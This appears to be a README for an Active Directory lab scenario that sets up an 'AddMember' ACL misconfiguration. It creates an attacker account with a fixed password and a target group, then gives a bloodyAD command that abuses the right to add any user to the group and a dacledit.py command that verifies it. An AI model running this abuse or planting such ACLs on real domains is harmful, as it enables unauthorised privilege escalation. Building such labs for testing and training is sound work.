# acl-addmember

User that can write the member attribute of a group (AddMember). Creates `scn-acl-add-attacker` (password `Aa1234567890!`) and the group `scn-acl-add-group`, and gives the attacker `Ext-Write-Self-Membership` (inheritance `All`) on it.

Attack:

    bloodyAD -d <domain> -u scn-acl-add-attacker -p 'Aa1234567890!' --host <dc ip> add groupMember scn-acl-add-group <any user>

How to verify:

    dacledit.py -action read -principal scn-acl-add-attacker -target scn-acl-add-group <domain>/scn-acl-add-attacker:'Aa1234567890!' -dc-ip <dc ip>   # shows WriteProperty on member

Disable deletes both objects (the ACE goes with the target).
